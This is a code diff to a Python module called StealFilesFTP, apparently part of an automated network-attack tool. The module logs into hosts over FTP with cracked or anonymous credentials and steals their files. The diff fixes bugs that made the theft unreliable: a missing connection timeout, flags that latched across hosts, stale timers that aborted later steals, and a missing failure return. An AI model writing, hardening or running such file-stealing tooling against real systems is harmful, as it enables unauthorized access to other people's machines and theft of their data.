@@ -8,7 +8,7 @@ import time
 from rich.console import Console
 from threading import Timer
 from ftplib import FTP
-from shared import SharedData
+from shared import SharedData, settle_for_display
 from logger import Logger
 
 # Configure the logger
@@ -40,7 +40,7 @@ class StealFilesFTP:
         """
         try:
             ftp = FTP()
-            ftp.connect(ip, 21)
+            ftp.connect(ip, 21, timeout=10)  # bounded: no timeout blocked the orchestrator on a filtered host
             ftp.login(user=username, passwd=password)
             self.ftp_connected = True
             logger.info(f"Connected to {ip} via FTP with username {username}")
@@ -92,9 +92,16 @@ class StealFilesFTP:
         try:
             if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                 self.shared_data.bjornorch_status = "StealFilesFTP"
+                # Per-run state, reset here rather than only in __init__. These objects are
+                # long-lived singletons built once by orchestrator.load_action, so the flags
+                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
+                # and every later steal on every host broke out immediately and returned
+                # 'failed' — permanently, until the service restarted. Conversely a single
+                # success left *_connected True and disarmed the timeout for good.
+                self.stop_execution = False
+                self.ftp_connected = False
                 logger.info(f"Stealing files from {ip}:{port}...")
-                # Wait a bit because it's too fast to see the status change
-                time.sleep(5)
+                settle_for_display(self.shared_data)  # let the panel show this action's name
 
                 # Get FTP credentials from the cracked passwords file
                 ftpfile = self.shared_data.ftpfile
@@ -123,15 +130,24 @@ class StealFilesFTP:
                     logger.error(f"No valid credentials found for {ip}. Skipping...")
                     return 'failed'
 
+                # Token this run. timer.cancel() is only reached on the success path, so a failed
+                # steal leaves a live 240s timer behind; without this it would fire midway
+                # through a LATER host's steal and abort it by setting stop_execution.
+                run_token = object()
+                self._run_token = run_token
+
                 def timeout():
                     """
                     Timeout function to stop the execution if no FTP connection is established.
                     """
+                    if getattr(self, '_run_token', None) is not run_token:
+                        return  # a later execute() owns the flags now
                     if not self.ftp_connected:
                         logger.error(f"No FTP connection established within 4 minutes for {ip}. Marking as failed.")
                         self.stop_execution = True
 
                 timer = Timer(240, timeout)  # 4 minutes timeout
+                timer.daemon = True  # never hold up shutdown waiting for a 4-minute timer
                 timer.start()
 
                 # Attempt anonymous access first
@@ -185,6 +201,12 @@ class StealFilesFTP:
                     return 'failed'
                 else:
                     return 'success'
+            else:
+                # The four sibling steal modules all return here; this one had no `else` and fell
+                # off the end returning None, which the orchestrator then wrote as failed_<ts>
+                # anyway — the right outcome by accident, via an implicit return.
+                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
+                return 'failed'
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
             return 'failed'
